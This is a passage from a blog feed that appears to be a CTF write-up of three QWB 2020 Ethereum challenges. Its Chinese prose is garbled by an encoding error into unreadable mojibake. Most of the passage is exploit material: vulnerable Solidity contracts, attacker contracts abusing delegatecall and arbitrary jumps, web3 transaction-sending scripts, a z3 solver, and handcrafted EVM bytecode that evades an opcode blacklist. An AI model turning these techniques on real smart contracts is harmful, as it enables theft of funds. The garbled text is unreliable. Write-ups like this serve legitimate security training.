ÂØπÂ∫îÁöÑÊñá‰ª∂ÁöÑÂ§ßÂ∞èËé∑Âæó 1ipfs add -s size-26624 pic1.jpg ÂæóÂà∞ hash1 = QmYjQSMMux72UH4d6HX7tKVFaP27UzC65cRchbVAsh96Q7 flag=flag{md5(hash1+hash2)}=flag{35fb9b3fe44919974a02c26f34369b8e} EasyFake ÊÄùË∑ØÊù•Ëá™ rw2018 È¶ñÂ∏≠ÁöÑÈ¢òÁõÆÔºåËßâÂæóÁÇπÂ≠êÂæàÂ•ΩÔºåÁõ¥Êé•ÊääÈ¶ñÂ∏≠È¢òÁõÆÁöÑÁÇπÂ≠êÊãø‰∫ÜËøáÊù•23333ÔºåÂãøÂñ∑ÔºåÁÆÄÂåñÁâà ÂèØ‰ª•ÂÄüÂä© ida-evm Á≠âÂ∑•ÂÖ∑Êü•ÁúãÂÖ∂ÂáΩÊï∞Ë∞ÉÁî®ÂõæÂèäÂÖ∂ÁªÜËäÇ ËñÖÁæäÊØõÊòØÈÄÅÂàÜÁöÑÔºåËÄÉÁÇπÊòØ delegatecall ÔºåÁõ¥Êé•‰ªãÁªçÂà©Áî®ÊÄùË∑Ø Source1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495pragma solidity ^0.4.23;contract EasyFake &#123; uint public qwb_version = 4; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public status; string public constant hello = &quot;Welcome to S4 of qwb! Enjoy yourself :D&quot;; uint private constant randomNumber = 0; event SendFlag(address addr); constructor() public &#123; assembly &#123; sstore(0x1234, 0x4804a623) &#125; &#125; modifier onlyHuman&#123; uint size; address addr = msg.sender; assembly &#123; size := extcodesize(addr) &#125; require(size==0); _; &#125; function gift() public payable &#123; require(status[msg.sender]==0); balanceOf[msg.sender] += 10; status[msg.sender] = 1; &#125; function transferbalance(address to,uint amount) public &#123; require(balanceOf[msg.sender]&gt;=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; &#125; function payforflag(string s) public payable onlyHuman &#123; require(keccak256(abi.encodePacked(s)) == keccak256(&quot;iloveqwb&quot;)); if (balanceOf[msg.sender]&gt;=1000 &amp;&amp; msg.value == 1 ether) &#123; assembly &#123; mstore(0x800, 0x1234) mload(0x800) dup1 mstore(0x2000, 0x06ee) mload(0x2000) and(caller, 0xffff) jump pop pop pop &#125; &#125; else &#123; selfdestruct(msg.sender); &#125; &#125; function backdoor() public &#123; assembly &#123; mstore(0x2000,0x20) mload(0x2000) mstore(0x2000,0x0) mstore(0x2100,0x1234) mload(0x2100) mstore(0x2100,0) sload(extcodesize(caller)) mstore(0x20, sload(0x1234)) mstore(0x5000,0x3c) mload(0x5000) mstore(0x5000, 0x0) calldataload(0x7e) gas calldataload(0x5e) jump pop pop pop pop pop pop &#125; &#125; function() public payable &#123;&#125;&#125; Analyse ÂØπ‰∏äËø∞Ê∫êÁ†ÅÁºñËØëÁîüÊàêÁöÑÂ≠óËäÇÁ†ÅËøõË°å‰∫Ü‰∏Ä‰∫õÊîπÂä®ÔºåÂÆåÊï¥ÁöÑÂ≠óËäÇÁ†ÅÂèØÂú®Èìæ‰∏äÊü•ÊâæÂà∞ È¢òÁõÆË¶ÅÊ±ÇËß¶Âèë SendFlag ‰∫ã‰ª∂ÔºåÂèØÊòØÂπ∂Ê≤°Êúâ SendFlag ÔºåÊâÄ‰ª•ÈúÄË¶Å delegatecall ÔºåËøô‰∏™ÊÑèÂõæÂ∫îËØ•ÂæàÊòéÊòæ ÂØπ‰∫é backdoor ÂáΩÊï∞ÔºåÂÖ∂ÂáΩÊï∞Ê†àÂ¶Ç‰∏ãÊâÄÁ§∫Ôºå‰ºöË∑≥ËΩ¨Âà∞ calldataload(0x5e) ÔºåËøô‰∏™ÂæàÊòéÊòæÔºåÊàë‰ª¨Ë¶ÅË∑≥ËΩ¨Âà∞ delegatecall ÁöÑ‰ΩçÁΩÆÔºåÊü•ÁúãÂ≠óËäÇÁ†ÅÔºåÂèØ‰ª•ÊâæÂà∞‰ΩçÁΩÆ‰∏∫ 0x740 ÔºåÊâÄ‰ª• calldataload(0x5e:0x7e)=0x740 „ÄÇÂπ∂‰∏îËÆæÁΩÆ‰∫Ü memory[0x20,0x40]=sload(0x1234)=0x4804a623 ÔºåÂèØÂú®https://www.4byte.directory/Êü•ËØ¢Âà∞ÊòØ getflag() ÂáΩÊï∞ 1234567calldataload(0x5e) Ê†àÈ°∂gasRemainingcalldataload(0x7e)0x3c0x40x12340x20 Ê†àÂ∫ï 0x740 ‰ΩçÁΩÆ‰ª£Á†Å‰∏∫ 5bf45056ÔºåÂç≥Â¶Ç‰∏ã 1234JUMPDESTdelegatecallpopjump delegatecall ÂèÇÊï∞ÂØπÂ∫îÊ†àÂ¶Ç‰∏ãÔºåÊâÄ‰ª• calldataload(0x7e:0x9e)‰∏∫delegatecall Ë∞ÉÁî®ÁöÑ hack ÂêàÁ∫¶Âú∞ÂùÄÔºåmemory[0x3c:0x40]=0x4804a623 ÔºåÂç≥Ë∞ÉÁî® hack ÂêàÁ∫¶‰∏≠ÁöÑ getflag() ÂáΩÊï∞ÔºåËøîÂõûÂÄº‰øùÂ≠òÂú® memory[0x1234:0x1234+0x20] ‰∏≠ 123456gas gasRemainingaddr calldataload(0x7e)argsOffset 0x3cargsLength 0x4retOffset 0x1234retLength 0x20 Ê†àÂ∫ï Ë∞ÉÁî®ÂÆåÂáΩÊï∞Ê†à‰∏∫Á©∫Ôºå‰ΩÜÊ≠§Êó∂Êúâ‰∏™ jump ÔºåË¶ÅË∑≥ËΩ¨Âà∞Âì™ÈáåÂë¢ÔºåÊàë‰ª¨Âêë‰∏äÊâæÔºåÂèëÁé∞ payforflag ÈáåÈù¢Êúâ‰∏Ä‰∫õÊìç‰ΩúÔºåÊ†àËØ¶ÊÉÖÂ¶Ç‰∏ãÔºåÂ≠òÂú®‰∏Ä‰∏™‰ªªÊÑè caller ÊéßÂà∂ÁöÑË∑≥ËΩ¨ 1234caller &amp; 0xffff0x6ee0x12340x1234 ÂÅáËÆæË∑≥ËΩ¨Âà∞ backdoor ‰ΩçÁΩÆÔºåÂç≥ 0x06f2 ÔºåÂç≥Ë¶ÅÊ±Ç caller ÊúÄ‰ΩéÂõõÂ≠óËäÇ‰∏∫ 0x06f2 ÔºåÁªìÂêà‰∏äÈù¢ÁöÑÂàÜÊûêÔºå‰∏äËø∞ÊâßË°åÂÆå delegatecall ‰πãÂêé‰ºöË∑≥ËΩ¨Âà∞ 0x6ee ÔºåÊü•Áúã 0x6ee Â§ÑÁöÑÂ≠óËäÇÁ†ÅÊòØ 5b510156 ÔºåÊìç‰ΩúÁ†ÅÂ¶Ç‰∏ã 1234JUMPDESTMLOADADDJUMP Ê≠§Êó∂Ê†àÂèòÊàê‰∫Ü‰∏ãÈù¢ËøôÊ†∑ÔºåÂç≥‰ºöË∑≥ËΩ¨Âà∞ mload(0x1234)+0x1234 ÔºåÊ≠§Êó∂Ê†à‰∏∫Á©∫ÔºåËÄå 123addmload(0x1234)0x1234 ‰∏∫‰∫Ü‰øùÊåÅÊ†àÂπ≥Ë°°ÔºåÊàë‰ª¨ÈúÄË¶ÅË∑≥ËΩ¨Âà∞ stop ÁöÑ‰ΩçÁΩÆÔºåÊ≠£Â∏∏ÁªìÊùüÂπ∂Áª¥ÊåÅÊ†àÂπ≥Ë°°ÔºåÂèØ‰ª•ÊâæÂà∞ 0x2c1 ‰ΩçÁΩÆÔºåÂç≥ mload(0x1234)+0x1234=0x2c1 Âç≥ÂèØÔºåÂç≥Ë¶ÅÊ±Ç hack ÂêàÁ∫¶‰∏≠ÁöÑ getflag() ÂáΩÊï∞ËøîÂõûÂÄº‰∏∫ 0x2c1-0x1234=0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff08d Exp ‰ΩøÁî®‰∏ãÈù¢‰ª£Á†ÅËñÖÁæäÊØõÔºåËΩ¨Âà∞Âú∞ÂùÄÊúÄÂêéÂõõÂ≠óËäÇ‰∏∫ 0x06f2 12345678910111213141516contract father &#123; constructor() public &#123; for (uint i=0; i&lt;100; i++) &#123; son ason = new son(); &#125; &#125;&#125;contract son &#123; constructor() public &#123; EasyFake tmp = EasyFake(0x742eB40659c7Dae2CD436B9E2741696a2F622DB2); tmp.gift(); tmp.transferbalance(address(0x15697F62095549B50F2897F6840D36aB1e0b06f2),10); &#125;&#125; ÈÉ®ÁΩ≤ hack ÂêàÁ∫¶Ôºå‰Ωú‰∏∫ delegatecall ÂèÇÊï∞ 1234567contract hack &#123; event SendFlag(address addr); function getflag() payable public returns(uint256) &#123; emit SendFlag(msg.sender); return 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff08d; &#125;&#125; ‰ΩøÁî®ÊúÄÂêéÂõõÂ≠óËäÇ 0x06f2 ÁöÑËøô‰∏™Ë¥¶Êà∑Ë∞ÉÁî® payforflag ÂáΩÊï∞ÔºåÊ†πÊçÆÂ¶Ç‰∏äÂàÜÊûêÔºåpayload Â¶Ç‰∏ãÊâÄÁ§∫ 12345678910111213141516171819202122232425262728293031323334from web3 import Web3, HTTPProviderw3 = Web3(Web3.HTTPProvider(&apos;https://ropsten.infura.io/v3/xxxxxxxxxxx&apos;))# contract_instance = web3.eth.contract(address=config[&apos;address&apos;], abi=config[&apos;abi&apos;])contract_address = &quot;0x742eB40659c7Dae2CD436B9E2741696a2F622DB2&quot;private = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;public = &quot;0x15697F62095549B50F2897F6840D36aB1e0b06f2&quot;data = &apos;0x6bc344bc&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000020&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000008&apos;data += &apos;696c6f7665717762000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000740&apos;data += &apos;000000000000000000000000882DfFd71DFb9A8f0E5985207587ebd77611A9f3&apos;data += &apos;0000&apos;def do_callme(public): txn = &#123; &apos;from&apos;: Web3.toChecksumAddress(public), &apos;to&apos;: Web3.toChecksumAddress(contract_address), &apos;gasPrice&apos;: w3.eth.gasPrice, &apos;gas&apos;: 8000000, &apos;nonce&apos;: w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), &apos;value&apos;: Web3.toWei(1, &apos;ether&apos;), &apos;data&apos;: data, &#125; signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print(&quot;txn_hash=&quot;, txn_hash) return txn_receiptprint(do_callme(public)) EasyAssembly È¢òÁõÆÊÄùË∑ØÊù•Ëá™‰∫é rw2019 ËÄÉÁÇπÊúâ‰∏§‰∏™Ôºö Âú®ÂêàÁ∫¶Â≠óËäÇÁ†ÅÂêéËøõË°å padding ‰∏ç‰ºöÂΩ±ÂìçÂêàÁ∫¶ÁöÑÈÉ®ÁΩ≤ create2 ÂàõÂª∫Âú∞ÂùÄÁöÑÊñπÂºè Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108pragma solidity ^0.5.10;contract EasyAssembly &#123; event SendFlag(address addr); uint randomNumber = 0; bytes32 private constant ownerslot = keccak256(&apos;Welcome to qwb!!! You will find this so easy ~ Happy happy :D&apos;); bytes32[] public puzzle; uint count = 0; mapping(address=&gt;bytes32) WinChecksum; constructor() public payable &#123; setAddress(ownerslot, msg.sender); &#125; modifier onlyWin(bytes memory code) &#123; require(WinChecksum[msg.sender] != 0); bytes32 tmp = keccak256(abi.encodePacked(code)); address target; assembly &#123; let t1,t2,t3 t1 := and(tmp, 0xffffffffffffffff) t2 := and(shr(0x40,tmp), 0xffffffffffffffff) t3 := and(shr(0x80,tmp), 0xffffffff) target := xor(mul(xor(mul(t3, 0x10000000000000000), t2), 0x10000000000000000), t1) &#125; require(address(target)==msg.sender); _; &#125; function setAddress(bytes32 _slot, address _address) internal &#123; bytes32 s = _slot; assembly &#123; sstore(s, _address) &#125; &#125; function deploy(bytes memory code) internal returns(address addr) &#123; assembly &#123; addr := create2(0, add(code, 0x20), mload(code), 0x1234) if eq(extcodesize(addr), 0) &#123; revert(0, 0) &#125; &#125; &#125; function gift() public payable &#123; require(count == 0); count += 1; if(msg.value &gt;= address(this).balance)&#123; emit SendFlag(msg.sender); &#125;else&#123; selfdestruct(msg.sender); &#125; &#125; function pass(uint idx, bytes memory bytecode) public &#123; address addr = deploy(bytecode); bytes32 cs = tag(bytecode); bytes32 tmp = keccak256(abi.encodePacked(uint(1))); uint32 v; bool flag = false; assembly &#123; let v1,v2 v := sload(add(tmp, idx)) if gt(v, sload(0))&#123; v1 := and(add(and(v,0xffffffff), and(shr(0x20,v), 0xffffffff)), 0xffffffff) v2 := and(add(xor(and(shr(0x40,v), 0xffffffff), and(shr(0x60,v), 0xffffffff)), and(shr(0x80,v),0xffffffff)), 0xffffffff) if eq(xor(mul(v2,0x100000000), v1), cs)&#123; flag := 1 &#125; &#125; &#125; if(flag)&#123; WinChecksum[addr] = cs; &#125;else&#123; WinChecksum[addr] = bytes32(0); &#125; &#125; function tag(bytes memory a) pure public returns(bytes32 cs) &#123; assembly&#123; let groupsize := 16 let head := add(a,groupsize) let tail := add(head, mload(a)) let t1 := 0x13145210 let t2 := 0x80238023 let m1,m2,m3,m4,s,tmp for &#123; let i := head &#125; lt(i, tail) &#123; i := add(i, groupsize) &#125; &#123; s := 0x59129121 tmp := mload(i) m1 := and(tmp,0xffffffff) m2 := and(shr(0x20,tmp),0xffffffff) m3 := and(shr(0x40,tmp),0xffffffff) m4 := and(shr(0x60,tmp),0xffffffff) for &#123; let j := 0 &#125; lt(j, 0x4) &#123; j := add(j, 1) &#125; &#123; s := and(mul(s, 2),0xffffffff) t2 := and(add(t1, xor(sub(mul(t1, 0x10), m1),xor(add(t1, s),add(div(t1,0x20), m2)))), 0xffffffff) t1 := and(add(t2, xor(add(mul(t2, 0x10), m3),xor(add(t2, s),sub(div(t2,0x20), m4)))), 0xffffffff) &#125; &#125; cs := xor(mul(t1,0x100000000),t2) &#125; &#125; function payforflag(bytes memory code) public onlyWin(code) &#123; emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125;&#125; Analyse tag ÊòØÂØπÂ≠óËäÇÁ†ÅËøõË°åÁºñÁ†ÅÂæóÂà∞ csÔºåpass ÊòØÂØπ cs ËøõË°åÊ†°È™åÔºåÂèØ‰ª•ÂàÜÊûêÂèëÁé∞ÊòØÂØπ owner ËøõË°åÁõ∏ÂÖ≥ËÆ°ÁÆóÔºåÂØπÂÖ∂ÁªìÊûúËÆ∞‰∏∫ targetÔºåÂç≥ csÁªèËøáÊ†°È™åÂêéÁ≠â‰∫é target ÊîªÂáªÂêàÁ∫¶hackÔºåËé∑Âèñbytecode 12345678contract hack &#123; address instance_address = 0xbA2e98a2795c193F58C8CE1287fDA28e089c313a ; EasyAssembly target = EasyAssembly(instance_address); function hack1(bytes memory code) public &#123; target.payforflag(code); &#125;&#125; Ê≠£Â∏∏ÊÉÖÂÜµ‰∏ãÔºåÂØπÂêàÁ∫¶Â≠óËäÇÁ†ÅËøõË°åÁºñÁ†ÅÂêéÊ≠£Â•ΩÁ≠â‰∫éÁâπÂÆöÊüê‰∏™ÂÄºÁöÑÂá†ÁéáÂá†‰πé‰∏∫ 0 ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂè¶ÊÉ≥ÂäûÊ≥ïÔºåËøôÈáåÁî®Âà∞ËÄÉÁÇπ‰∏ÄÔºåÂêàÁ∫¶Â≠óËäÇÁ†ÅÂêéËøõË°å padding ‰∏ç‰ºöÂΩ±ÂìçÂêàÁ∫¶ÁöÑÈÉ®ÁΩ≤ ‰ΩøÁî® tag ËÆ°ÁÆóÊîªÂáªÂêàÁ∫¶ hack Â≠óËäÇÁ†ÅÁöÑ cs ÔºåÁÑ∂ÂêéÊàë‰ª¨ËÆ°ÁÆóÈúÄË¶Å padding ÁöÑÂ≠óËäÇ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from z3 import *def find(last, target): t1, t2 = int(last[:8], 16), int(last[8:], 16) tar1, tar2 = int(target[:8], 16), int(target[8:], 16) s = 0x59129121 s = BitVecVal(s, 256) m1 = BitVec('m1', 256) m2 = BitVec('m2', 256) m3 = BitVec('m3', 256) m4 = BitVec('m4', 256) for j in range(4): s = (s + s) &amp; 0xffffffff p1 = (t1&lt;&lt;4) - m1 p2 = t1 + s p3 = (t1&gt;&gt;5) + m2 t2 = (t1 + (p1^(p2^p3))) &amp; 0xffffffff p1 = (t2&lt;&lt;4) + m3 p2 = t2 + s p3 = (t2&gt;&gt;5) - m4 t1 = (t2 + (p1^(p2^p3))) &amp; 0xffffffff sol = Solver() sol.add(And(t1 == tar1, t2 == tar2)) if sol.check(): m = sol.model() m_l = map(lambda x: m[x].as_long(), [m4, m3, m2, m1]) pad = 0 for x in m_l: pad &lt;&lt;= 0x20 pad |= x return hex(pad)[2:].zfill(32) else: raise Exception('No solution')def cal_target(address): a = address &amp; 0xffffffff b = address&gt;&gt;0x20 &amp; 0xffffffff c = address&gt;&gt;0x40 &amp; 0xffffffff d = address&gt;&gt;0x60 &amp; 0xffffffff e = address&gt;&gt;0x80 &amp; 0xffffffff v1 = (a+b) &amp; 0xffffffff v2 = ((c ^ d) + e) &amp; 0xffffffff target = v2&lt;&lt;0x20 | v1 print hex(target) return hex(target)address = 0x000000000000000000000000082d1deb3d08277650966471756b06fead5cb43flast = "a7f27fea495824ae"target = cal_target(address)[2:-1]print find(last, target) Ë∞ÉÁî® pass ÔºåÂÖ∂‰∏≠ idx ‰∏∫ owner ÊâÄÂú®ÁöÑ slot ‰∏é puzzle Êï∞ÁªÑÊï∞ÊçÆËµ∑Âßã‰ΩçÁΩÆÁöÑÂ∑ÆÂÄºÔºåÊòØ‰∏™Âõ∫ÂÆöÂÄº17666428025195830108258939064971598484477117555719083663154155265588858226250 Ôºåbytecode ÊòØËøõË°å padding ‰πãÂêéÁöÑÂ≠óËäÇÁ†ÅÔºàËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÂ≠óËäÇÁ†Å 16 Â≠óËäÇÂØπÈΩêÔºâ Ë∞ÉÁî® hack ÊîªÂáªÂêàÁ∫¶ÁöÑ hack1 Âç≥ÂèØÔºåËøôÈáåÁöÑ code ÊòØ create2() ‰∏≠ÁöÑÂèÇÊï∞ÔºåÂèØÈÄöËøá‰∏ãËø∞ËÑöÊú¨ËÆ°ÁÆóÔºåcode Â∞±ÊòØËÑöÊú¨‰∏≠ÁöÑ s Create2 : keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:] 1234567891011121314from web3 import Web3def bytesToHexString(bs): return ''.join(['%02X' % b for b in bs])bytecode = '0x608060405273ba2e98a2795c193f58c8ce1287fda28e089c313a6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100c657600080fd5b50610248806100d66000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063489dc88514610030575b600080fd5b6100e96004803603602081101561004657600080fd5b810190808035906020019064010000000081111561006357600080fd5b82018360208201111561007557600080fd5b8035906020019184600183028401116401000000008311171561009757600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506100eb565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662a9a87e82306040518363ffffffff1660e01b815260040180806020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828103825284818151815260200191508051906020019080838360005b838110156101ab578082015181840152602081019050610190565b50505050905090810190601f1680156101d85780820380516001836020036101000a031916815260200191505b509350505050600060405180830381600087803b1580156101f857600080fd5b505af115801561020c573d6000803e3d6000fd5b505050505056fea265627a7a72315820fc052defd6381390e09fa96b74c0f55872043fcede05171fb78f3c814d755fe664736f6c6343000511003200007197d58f43114ce23d95b93f9df2bb08'a = '0xff' # 1 byteb = 'bA2e98a2795c193F58C8CE1287fDA28e089c313a' # b: deploy address 20 bytesc = '0'*60 + '1234' # c: seed 32 bytesd = bytesToHexString(Web3.sha3(hexstr=bytecode)) # deploy bytecode 32 bytess = a+b+c+dprint(s)address = '0x' + bytesToHexString(Web3.sha3(hexstr=s))[24:]print(address) EasySandboxSource1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859pragma solidity ^0.5.10;contract EasySandbox &#123; uint256[] public writes; mapping(address =&gt; address[]) public sons; address public owner; uint randomNumber = 0; constructor() public payable &#123; owner = msg.sender; sons[msg.sender].push(msg.sender); writes.length -= 1; &#125; function given_gift(uint256 _what, uint256 _where) public &#123; if(_where != 0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9f) &#123; writes[_where] = _what; &#125; &#125; function easy_sandbox(address _addr) public payable &#123; require(sons[owner][0] == owner); require(writes.length != 0); bool mark = false; for(uint256 i = 0; i &lt; sons[owner].length; i++) &#123; if(msg.sender == sons[owner][i]) &#123; mark = true; &#125; &#125; require(mark); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; bool success; bytes memory _; (success, _) = _addr.delegatecall(&quot;&quot;); require(success); require(writes.length == 0); require(sons[owner].length == 1 &amp;&amp; sons[owner][0] == tx.origin); &#125;&#125; Analyse È¢òÁõÆÈÄÜÂêëËøòÊòØÊúâÈöæÂ∫¶ÁöÑÔºåÂêéÊù•Áõ¥Êé•Áªô‰∫ÜÊ∫êÁ†Å ËÄÉÁÇπÊúâ‰∏â‰∏™Ôºö ËÄÉÂØüÂØπÂä®ÊÄÅÊï∞ÁªÑ„ÄÅmapÁ±ªÂûãÊï∞ÊçÆÁöÑÂ≠òÂÇ®ËßÑÂàôËÆ°ÁÆó ËÄÉÂØüÂØπ EVM ÊâßË°åÁöÑÁêÜËß£ ËÄÉÂØü create2 ÂèØ‰ª•ÁúãÂà∞‰∏ª‰ΩìÂáΩÊï∞Â∞±‰∏§‰∏™ given_gift ‰ªªÊÑèÂÜô easy_sandbox ËøáÊª§‰∫Ü f0„ÄÅf1„ÄÅf2„ÄÅf4„ÄÅfa„ÄÅff Ëøô‰∫õÂ≠óËäÇÔºåÂ¶ÇÊûúÁ´ôÂú®Êìç‰ΩúÁ†ÅÂ±ÇÊ¨°ÔºåËøô‰∫õÂ≠óËäÇÂØπÂ∫îÊìç‰ΩúÁ†ÅÂàÜÂà´ÊòØ create„ÄÅcall„ÄÅcallcode„ÄÅdelegatecall„ÄÅstaticcall„ÄÅselfdestructÔºåÁõ∏ÂΩì‰∫éËøô‰∫õÊìç‰ΩúÁ†ÅÈÉΩ‰∏çËÉΩ‰ΩøÁî®ÔºåÂ¶ÇÊûúÊÉ≥Ë¶ÅÊ∏ÖÁ©∫ÂêàÁ∫¶‰ΩôÈ¢ùÁöÑËØùÔºåÂè™ËÉΩ‰ΩøÁî® create2 ÂàõÂª∫‰∏Ä‰∏™Á±ª‰ººËΩ¨Ë¥¶ÁöÑÂêàÁ∫¶ Exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495pragma solidity ^0.5.10;contract EasySandbox &#123; function given_gift(uint256 _what, uint256 _where) public &#123;&#125; function easy_sandbox(address _addr) public payable &#123;&#125;&#125;/*owner 0x3d16CAAf6E5C0bB28787F38Aba430E17F301e737tx.origin 0x1e7AEf620B2ad727193DD1B2ADda7f1e535CbfB3pos1 = kec(owner | 1) = 0xfabdb57a8705ecba0fd43952ffce712af6481580f284fb255bc099ff824b60a8pos2 = kec(kec(owner | 1)) = 0x5db10778892cc9518ed72a1672706295f104d0e8fde9e79a67c38a7cf69a5399sstore(pos1, 1) 60017f8abdb57a8705ecba0fd439528fce712af64815808284fb255bc09988824b60a87f70000000000000000000000070000000000000007000000000000077000000000155[1] PUSH1 0x01[34] PUSH32 0x8abdb57a8705ecba0fd439528fce712af64815808284fb255bc09988824b60a8[67] PUSH32 0x7000000000000000000000007000000000000000700000000000007700000000[68] ADD[69] SSTOREsstore(0, 0) 60008055[1] PUSH1 0x00[2] DUP1[3] SSTOREsstore(pos2, tx.origin) 327f30000000000000000000000000000000050000000000000000000000000000007f8db10778892cc9518ed72a1672706295f604d0e8fde9e79a67c38a7cf69a53990355[0] ORIGIN[33] PUSH32 0x3000000000000000000000000000000005000000000000000000000000000000[66] PUSH32 0x8db10778892cc9518ed72a1672706295f604d0e8fde9e79a67c38a7cf69a5399[67] SUB[68] SSTOREcreate2 SELFDESTRUCT 6132fe6001013452346004601c3031f5[2] PUSH2 0x32fe[4] PUSH1 0x01[5] ADD[6] CALLVALUE[7] MSTORE[8] CALLVALUE[10] PUSH1 0x04[12] PUSH1 0x1c[13] ADDRESS[14] BALANCE[15] CREATE2*/contract pikachu &#123; constructor() public payable &#123; assembly &#123; mstore(0x00, 0x60017f8abdb57a8705ecba0fd439528fce712af64815808284fb255bc0998882) mstore(0x20, 0x4b60a87f70000000000000000000000070000000000000007000000000000077) mstore(0x40, 0x00000000015560008055327f3000000000000000000000000000000005000000) mstore(0x60, 0x0000000000000000000000007f8db10778892cc9518ed72a1672706295f604d0) mstore(0x80, 0xe8fde9e79a67c38a7cf69a539903556132fe6001013452346004601c3031f500) return(0x00, 0xa0) &#125; &#125;&#125;contract Hack &#123; EasySandbox private constant target = EasySandbox(0xde07f6D17206CdC4f2Af94ad9e6324544a70a360); constructor() public payable &#123; bool result; // modify kec(owner | 1) = 2 (result, ) = address(target).call(abi.encodeWithSelector( 0x5e08b9d5, 2, uint(0xfabdb57a8705ecba0fd43952ffce712af6481580f284fb255bc099ff824b60a8-0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563) )); require(result); // modify kec(kec(owner | 1)) + 1 = msg.sender (result, ) = address(target).call(abi.encodeWithSelector( 0x5e08b9d5, uint(address(this)), uint(0x5db10778892cc9518ed72a1672706295f104d0e8fde9e79a67c38a7cf69a5399-0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563+1) )); require(result); // writes.length == 0 // sons[owner].length == 1 &amp;&amp; sons[owner][0] == tx.origin // empty balance pikachu hack = new pikachu(); (result, ) = address(target).call(abi.encodeWithSelector( 0xc94103b1, hack )); require(result); &#125;&#125; ÂÖ∑‰ΩìËøáÁ®ãÈÉΩÂú®‰∏äÈù¢ exp ÁöÑÊ≥®ÈáäÈáåÈù¢ ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºö Áî±‰∫é sandbox Á¶ÅÊ≠¢ÁöÑÊòØÁâπÂÆöÁöÑÂ≠óËäÇÔºåËÄå‰∏çÊòØÁâπÂÆöÁöÑÊìç‰ΩúÁ†ÅÔºåËøôÊÑèÂë≥ÁùÄÂú®‰∏ä‰∏ãÊñá‰∏≠‰πüÁ¶ÅÊ≠¢Ëøô‰∫õÂ≠óËäÇÔºåÊâÄ‰ª•Êàë‰ª¨ÁöÑ code Ë¶Å‰ΩøÁî®Â≠óËäÇÁ†ÅÁºñÂÜô Ëã•Âú®ÊîªÂáªÂ≠óËäÇÁ†Å‰∏≠Âá∫Áé∞‰∫Ü sandbox ‰∏≠ÁöÑÈªëÂêçÂçïÂ≠óËäÇÔºåÊàë‰ª¨ÈúÄË¶Å‰ΩøÁî®Â∑ßÂ¶ôÁöÑÊñπÂºèÂéªÁªïËøáÂÆÉ]]></content>
      <categories>
        <category>qwb2020</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>qwb2020</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰∏ÄÊ≠•‰∏ÄÊ≠•ÊûÑÂª∫ dl-runtime-resolve]]></title>
    <url>%2F2020%2Fstepbystep-dl-runtime-resolve%2F</url>
